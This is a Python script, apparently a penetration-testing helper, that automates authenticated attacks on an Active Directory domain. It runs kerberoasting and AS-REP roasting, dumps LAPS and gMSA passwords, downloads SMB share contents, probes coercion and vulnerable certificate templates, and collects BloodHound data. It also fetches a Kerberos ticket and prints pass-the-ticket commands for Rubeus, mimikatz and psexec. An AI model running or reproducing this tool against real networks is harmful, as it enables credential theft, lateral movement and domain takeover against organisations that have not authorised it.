import argparse
import os
import sys
import subprocess
import time
import glob
import shutil
import getpass

YELLOW = "\033[33m"
DARK_WHITE = "\033[2;37m"
BLUE = "\033[34m"
RESET = "\033[0m"

user = getpass.getuser()

def parse_args():
    usage_text = """\
Helper script to perform authenticated active directory tasks.

Example usage:
  python3 ad-authed.py --target-ip 192.168.223.30 -u username -p password
  python3 ad-authed.py --target-ip 192.168.223.30 -u username -H somehash
  export KRB5CCACHE='/path/to/ccache/file'
  python3 ad-authed.py --target-ip 192.168.223.30 -k
  python3 ad-authed.py --target-ip 192.168.223.30 -d example.com -u username -p password

"""
    parser = argparse.ArgumentParser(
        description="",
        usage=usage_text,
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    parser.add_argument('-t', '--target-ip', help='Specify the target IP', required=True)
    parser.add_argument('-x', '--proxychains', action='store_true', help='Enable proxychains')
    parser.add_argument('-u', '--username', help='Specify the username')
    parser.add_argument('-p', '--password', help='Specify the password')
    parser.add_argument('-H', '--hash', help='Specify the hash')
    parser.add_argument('-k', '--ticket', action='store_true', help='Use the ccache ticket from the KRB5CCACHE environment variable')
    parser.add_argument('-d', '--domain', help='Specify the domain')
    parser.add_argument('-h', '--help', action='help', help='Show this help message and exit')

    args = parser.parse_args()
    
    if sum(1 for arg in [args.password, args.hash, args.ticket] if arg) != 1:
        parser.error("You must specify exactly one of password (-p), hash (-H), or ticket (-k).")
    
    if not args.ticket and not args.username:
        parser.error("The --username argument is required unless --ticket is used.")
    
    return args


def get_domain_dc(args):
    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        output = subprocess.check_output(proxychains_command + ['nxc', 'smb', args.target_ip]).decode('utf-8')
        lines = output.split('\n')
        domain = dc = hostname = None
        
        for line in lines:
            if '(domain:' in line:
                domain_from_output = line.split('(domain:')[1].split(')')[0]
                if not args.domain:
                    domain = domain_from_output
                elif args.domain and domain_from_output != args.domain:
                    raise ValueError(f"Provided domain {args.domain} does not match discovered domain {domain_from_output}")
            if 'name:' in line:
                hostname = line.split('(name:')[1].split(')')[0]
                dc = hostname + '.' + (args.domain if args.domain else domain)
        
        if not domain and not args.domain:
            raise ValueError("Could not find domain in the output and no domain was provided.")
        
        if not dc:
            raise ValueError("Could not find DC in the output.")
        
        if not hostname:
            raise ValueError("Could not find hostname in the output.")
        
        if args.domain:
            domain = args.domain

        return domain, dc, hostname
    
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        sys.exit(1)



def get_username_from_ticket():
    try:
        output = subprocess.check_output(['klist']).decode('utf-8')
        lines = output.split('\n')
        for line in lines:
            if line.startswith('Default principal:'):
                return line.split(':')[1].strip().split('@')[0]
    except subprocess.CalledProcessError as e:
        print(f"Error retrieving username from ticket: {e}")
        sys.exit(1)

def display_values(args):
    print(f"Target: {args.target_ip}")
    print(f"Proxychains: {'Enabled' if args.proxychains else 'Disabled'}")
    if args.username:
        print(f"Username: {args.username}")
    if args.password:
        print("Password: [REDACTED]")
    if args.hash:
        print(f"Hash: {args.hash}")
    if args.ticket:
        print(f"Ccache ticket: Yes")

def run_command_with_password(target, username, password, domain, dc):
    print(f"Running command with password for target {target}, username {username}, domain {domain}, dc {dc}")

def run_command_with_hash(target, username, hash_value, domain, dc):
    print(f"Running command with hash for target {target}, username {username}, hash {hash_value}, domain {domain}, dc {dc}")

def run_command_with_ticket(target, domain, dc):
    krb5ccname = os.getenv('KRB5CCNAME')
    if not krb5ccname:
        print("Error: KRB5CCNAME environment variable is not set.")
        print("Please set the KRB5CCNAME environment variable to the path of the ccache file.")
        print("Example: export KRB5CCNAME='/path/to/ccache/file'")
        sys.exit(1)
    print(f"Running command with ccache ticket for target {target} using KRB5CCNAME={krb5ccname}, domain {domain}, dc {dc}")

def gather_bloodhound_data(args, domain, dc, output_dir):

    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{args.username}', '-p', args.password, '--bloodhound', '-c', 'all', '--dns-server', args.target_ip, '--dns-timeout', '10', '--dns-tcp']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{args.username}', '-H', args.hash, '--bloodhound', '-c', 'all', '--dns-server', args.target_ip, '--dns-timeout', '10', '--dns-tcp']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '-d', domain, '--bloodhound', '-c', 'all', '--dns-server', args.target_ip, '--dns-timeout', '10', '--dns-tcp']
        
        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        bloodhound_dir = os.path.join(output_dir, 'bloodhound')
        os.makedirs(bloodhound_dir, exist_ok=True)
        
        log_dir = os.path.expanduser("~/.nxc/logs/")
        for filename in os.listdir(log_dir):
            if 'bloodhound' in filename:
                src = os.path.join(log_dir, filename)
                dst = os.path.join(bloodhound_dir, filename)
                shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running BloodHound data gathering: {e}")
        sys.exit(1)
    except Exception as ex:
        print(f"Error: {ex}")
        sys.exit(1)



def gather_kerberoasting_data(args, domain, dc, output_dir):

    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '--kerberoasting', 'kerberoast-output.txt']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '--kerberoasting', 'kerberoast-output.txt']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '--kerberoasting', 'kerberoast-output.txt']
        
        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'kerberoast-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running Kerberoasting data gathering: {e}")
        sys.exit(1)


def gather_ldap_signing_data(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '-M', 'ldap-checker']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '-M', 'ldap-checker']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '-M', 'ldap-checker']

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'ldap-checker-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running LDAP signing data gathering: {e}")
        sys.exit(1)

def gather_machine_account_quota(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '-M', 'maq']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '-M', 'maq']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '-M', 'maq']

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'maq-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running machine account quota data gathering: {e}")
        sys.exit(1)

def gather_laps_data(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '-M', 'laps']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '-M', 'laps']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '-M', 'laps']

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'laps-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running LAPS data gathering: {e}")
        sys.exit(1)

def gather_delegation_data(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '--trusted-for-delegation']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '--trusted-for-delegation']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '--trusted-for-delegation']

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'delegation-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running delegation data gathering: {e}")
        sys.exit(1)

def gather_gmsa_data(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '--gmsa']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '--gmsa']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '--gmsa']

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'gmsa-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running gMSA data gathering: {e}")
        pass

def gather_trusts_data(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '-M', 'enum_trusts']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '-M', 'enum_trusts']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'ldap', args.target_ip, '--use-kcache', '-M', 'enum_trusts']

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'enum_trusts-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running domain trusts enumeration: {e}")
        sys.exit(1)

def gather_asreproasting_data(args, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        if args.password:
            cmd = proxychains_command + ['netexec', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-p', args.password, '--kdcHost', dc, '--asreproast', 'asreproasting-output.txt']
        elif args.hash:
            cmd = proxychains_command + ['netexec', 'ldap', args.target_ip, '-u', f'{domain}\\{args.username}', '-H', args.hash, '--kdcHost', dc, '--asreproast', 'asreproasting-output.txt']
        elif args.ticket:
            return

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        src = 'asreproasting-output.txt'
        dst = os.path.join(output_dir, src)
        if os.path.exists(src):
            shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running AS-REP roasting data gathering: {e}")
        sys.exit(1)

def gather_smb_data(args, domain, modules):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    proxychains_command = ['proxychains', '-q'] if args.proxychains else []

    for module in modules:
        try:
            if module.startswith('-M'):
                module = f'-M{module[2:]}'

            if args.password:
                cmd = proxychains_command + ['nxc', 'smb', args.target_ip, '-u', f'{args.username}', '-p', args.password, '-d', domain, module]
            elif args.hash:
                cmd = proxychains_command + ['nxc', 'smb', args.target_ip, '-u', f'{args.username}', '-H', args.hash, '-d', domain, module]
            elif args.ticket:
                cmd = proxychains_command + ['nxc', 'smb', args.target_ip, '--use-kcache', '-d', domain, module]
            
            print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
            subprocess.check_call(cmd)

        except subprocess.CalledProcessError as e:
            print(f"Error running smb command for module {module}: {e}")
            continue

        except Exception as ex:
            print(f"Error with module {module}: {ex}")
            continue


modules = [
    '--groups', '--local-groups', '--loggedon-users', '--rid-brute', 
    '--sessions', '--users', '--shares', '--pass-pol',
    '-Mwebdav', '-Mcoerce_plus', '-Mspooler', '-Menum_av'
]

def gather_smb_spider_data(args, output_dir, domain):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        
        if args.password:
            cmd = proxychains_command + ['nxc', 'smb', args.target_ip, '-u', f'{args.username}', '-p', args.password, '-d', domain, '-M', 'spider_plus', '-o', 'DOWNLOAD_FLAG=True']
        elif args.hash:
            cmd = proxychains_command + ['nxc', 'smb', args.target_ip, '-u', f'{args.username}', '-H', args.hash, '-d', domain, '-M', 'spider_plus', '-o', 'DOWNLOAD_FLAG=True']
        elif args.ticket:
            cmd = proxychains_command + ['nxc', 'smb', args.target_ip, '--use-kcache', '-d', domain, '-M', 'spider_plus', '-o', 'DOWNLOAD_FLAG=True']
        
        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd)
        
        spider_plus_dir = os.path.join(output_dir, 'spider_plus')
        os.makedirs(spider_plus_dir, exist_ok=True)
        
        src_dir = "/tmp/nxc_hosted/nxc_spider_plus/"
        for filename in os.listdir(src_dir):
            if 'spider_plus' in filename or args.target_ip in filename:
                src = os.path.join(src_dir, filename)
                dst = os.path.join(spider_plus_dir, filename)
                shutil.move(src, dst)

    except subprocess.CalledProcessError as e:
        print(f"Error running smb_spider: {e}")
        sys.exit(1)
    except Exception as ex:
        print(f"Error: {ex}")
        sys.exit(1)



def gather_enum4linux_ng_data(args, output_dir):

    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        enum4linux_command = [f'python3', f'/home/{user}/.local/bin/enum4linux-ng.py', '-A', args.target_ip]
        
        if args.password:
            cmd = proxychains_command + enum4linux_command + ['-u', args.username, '-p', args.password]
        elif args.hash:
            cmd = proxychains_command + enum4linux_command + ['-u', args.username, '-H', args.hash]
        elif args.ticket:
            return

        enum4linux_output_file = os.path.join(output_dir, "enum4linux-ng-output.txt")
        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)} and writing output to {enum4linux_output_file}")
        
        with open(enum4linux_output_file, 'w') as file:
            subprocess.check_call(cmd, stdout=file, stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError as e:
        print(f"Error running enum4linux-ng: {e}")
        print(f"Output: {e.output}")
        print(f"Error: {e.stderr}")
        sys.exit(1)



def gather_ldapdomaindump_data(args, domain, output_dir):

    GRAY = "\033[90m"
    RESET = "\033[0m"

    try:
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        ldapdomaindump_path = f'/home/{user}/.local/bin/ldapdomaindump'

        if args.password:
            cmd = proxychains_command + [ldapdomaindump_path, args.target_ip, '-u', f"{domain}\\{args.username}", '-p', args.password]
        elif args.hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{args.hash}"
            cmd = proxychains_command + [ldapdomaindump_path, args.target_ip, '-u', f"{domain}\\{args.username}", '-p', ntlm_hash, '-at', 'NTLM']
        elif args.ticket:
            return

        ldapdomaindump_output_dir = os.path.join(output_dir, "ldapdomaindump-output")
        if not os.path.exists(ldapdomaindump_output_dir):
            os.makedirs(ldapdomaindump_output_dir)

        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
        subprocess.check_call(cmd, cwd=ldapdomaindump_output_dir)

    except subprocess.CalledProcessError as e:
        print(f"Error running ldapdomaindump: {e}")
        sys.exit(1)


def get_tgt(args, domain, target_ip):
    proxychains_command = ['proxychains', '-q'] if args.proxychains else []

    if args.password:
        cmd = proxychains_command + ['python3', '/usr/share/doc/python3-impacket/examples/getTGT.py', f"{domain}/{args.username}:{args.password}"]
    elif args.hash:
        cmd = proxychains_command + ['python3', '/usr/share/doc/python3-impacket/examples/getTGT.py', f"{domain}/{args.username}", '-dc-ip', args.target_ip, '-hashes', f":{args.hash}"]
    else:
        return None

    tgt_file = f"{args.username}.ccache"
    tgt_dst_dir = f"ad-authed-{args.username}-{domain.replace('.', '-')}"
    
    if not os.path.exists(tgt_dst_dir):
        os.makedirs(tgt_dst_dir)

    tgt_src = os.path.abspath(tgt_file)
    tgt_dst_ccache = os.path.join(tgt_dst_dir, tgt_file)
    tgt_dst_kirbi = os.path.join(tgt_dst_dir, f"{args.username}.kirbi")

    print(f"Getting TGT: {' '.join(cmd)} > {tgt_src}")
    try:
        subprocess.check_call(cmd)
    except subprocess.CalledProcessError as e:
        print(f"Error getting TGT: {e}")
        sys.exit(1)

    try:
        shutil.move(tgt_src, tgt_dst_ccache)
    except FileNotFoundError:
        print(f"Error: {tgt_src} not found.")
        sys.exit(1)

    ticket_converter_cmd = ['python3', '/usr/share/doc/python3-impacket/examples/ticketConverter.py', tgt_dst_ccache, tgt_dst_kirbi]
    print(f"Converting TGT to KIRBI: {' '.join(ticket_converter_cmd)}")
    try:
        subprocess.check_call(ticket_converter_cmd)
    except subprocess.CalledProcessError as e:
        print(f"Error converting TGT to KIRBI: {e}")
        sys.exit(1)

    return tgt_dst_dir



def run_windapsearch(args, username, password, hash_value, domain, dc, output_dir):
    GRAY = "\033[90m"
    RESET = "\033[0m"

    modules = [
        'admin-objects', 'computers', 'domain-admins', 'gpos',
        'groups', 'privileged-users', 'unconstrained'
    ]
    
    windapsearch_dir = os.path.join(output_dir, 'windapsearch')
    os.makedirs(windapsearch_dir, exist_ok=True)

    proxychains_command = ['proxychains', '-q'] if args.proxychains else []
    base_cmd = proxychains_command + [f'/home/{user}/.local/bin/windapsearch']

    for module in modules:
        if args.proxychains:
            continue

        command = base_cmd + [
            '-u', username,
            '-d', domain,
            '--dc', dc,
            '-m', module
        ]

        if password:
            command += ['-p', password]
        elif hash_value:
            command += ['--hash', f'aad3b435b51404eeaad3b435b51404ee:{hash_value}']

        output_file = os.path.join(windapsearch_dir, f"{module}.txt")
        
        print(f"{GRAY}Running command:{RESET} {' '.join(command)} > {output_file}")

        with open(output_file, 'w') as f:
            try:
                result = subprocess.run(command, check=True, stdout=f, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                print(f"Error running windapsearch for module {module}: {e}")
                print(f"Return code: {e.returncode}")
                print(f"Output: {e.output.decode() if e.output else 'No output'}")



def print_psexec_command(args, target_ip, dc_ip, dc, ccache_file, hostname):
    LIGHT_BLUE = "\033[94m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"
    
    current_dir = os.getcwd()
    
    if ccache_file:
        ccache_filename = f"{args.username}.ccache"
        ccache_path = os.path.join(current_dir, ccache_file, ccache_filename)
        
        print(f"{LIGHT_BLUE}Rubeus.exe ptt /ticket:{args.username}.kirbi{RESET}")
        print(f"{LIGHT_BLUE}mimikatz.exe \"privilege::debug\" \"kerberos::ptt {args.username}.kirbi\"{RESET}")
        print(f"{LIGHT_BLUE}psexec.exe \\\\{target_ip} -accepteula cmd.exe{RESET}")
        print(f"{YELLOW}export KRB5CCNAME={ccache_path}{RESET}")
        print(f"{YELLOW}psexec.py -k -no-pass -target-ip {target_ip} -dc-ip {dc_ip} {hostname}{RESET}")

def gather_certipy_data(args, domain, dc, output_dir):
    try:
        if args.ticket:
            return

        certipy_binary = f'/home/{user}/.local/bin/certipy'
        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
        
        if args.hash:
            certipy_command = [
                certipy_binary, 'find', '-u', args.username,
                '-hashes', f'aad3b435b51404eeaad3b435b51404ee:{args.hash}',
                '-dc-ip', args.target_ip, '-vulnerable', '-old-bloodhound'
            ]
        else:
            certipy_command = [
                certipy_binary, 'find', '-u', args.username, '-p', args.password,
                '-dc-ip', args.target_ip, '-vulnerable', '-old-bloodhound'
            ]
        print(f"certipy command: {' '.join(map(str, certipy_command))}")
        subprocess.check_call(proxychains_command + certipy_command)

        time.sleep(2)

        files_to_move = glob.glob('*_Certipy.*')
        for file in files_to_move:
            filename = os.path.basename(file)
            src_path = os.path.abspath(file)
            dest_dir = os.path.join(output_dir, 'certipy')
            dest_path = os.path.join(dest_dir, filename)

            os.makedirs(dest_dir, exist_ok=True)

            shutil.move(src_path, dest_path)

        zip_file = os.path.join(output_dir, 'certipy', '*.zip')
        zip_files = glob.glob(zip_file)
        for zip_file in zip_files:
            bloodhound_dir = os.path.join(output_dir, 'bloodhound')
            os.makedirs(bloodhound_dir, exist_ok=True)
            shutil.move(zip_file, bloodhound_dir)

    except subprocess.CalledProcessError as e:
        print(f"Error running certipy: {e}")
        sys.exit(1)
    except Exception as ex:
        print(f"Error: {ex}")
        sys.exit(1)


def execute_commands(args, domain, dc, hostname):
    if args.ticket:
        args.username = get_username_from_ticket()

    domain_folder_name = domain.replace('.', '-')
    output_dir = f"ad-authed-{args.username}-{domain_folder_name}"

    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    ccache_file = None
    if not args.ticket:
        ccache_file = get_tgt(args, domain, args.target_ip)

    if args.password:
        run_command_with_password(args.target_ip, args.username, args.password, domain, dc)
        run_windapsearch(args, args.username, args.password, None, domain, dc, output_dir)
    elif args.hash:
        run_command_with_hash(args.target_ip, args.username, args.hash, domain, dc)
        run_windapsearch(args, args.username, None, args.hash, domain, dc, output_dir)
    elif args.ticket:
        run_command_with_ticket(args.target_ip, domain, dc)

    gather_enum4linux_ng_data(args, output_dir)
    gather_ldapdomaindump_data(args, domain, output_dir)
    gather_bloodhound_data(args, domain, dc, output_dir)
    gather_kerberoasting_data(args, domain, dc, output_dir)
    gather_asreproasting_data(args, domain, dc, output_dir)
    gather_delegation_data(args, domain, dc, output_dir)
    gather_gmsa_data(args, domain, dc, output_dir)
    gather_trusts_data(args, domain, dc, output_dir)
    gather_smb_data(args, domain, modules)
    gather_machine_account_quota(args, domain, dc, output_dir)
    gather_laps_data(args, domain, dc, output_dir)
    gather_smb_spider_data(args, output_dir, domain)
    gather_certipy_data(args, domain, dc, output_dir)
    
    print_psexec_command(args, args.target_ip, dc, args.target_ip, ccache_file, hostname)


def main():
    args = parse_args()
    domain, dc, hostname = get_domain_dc(args)
    execute_commands(args, domain, dc, hostname)

if __name__ == "__main__":
    main()
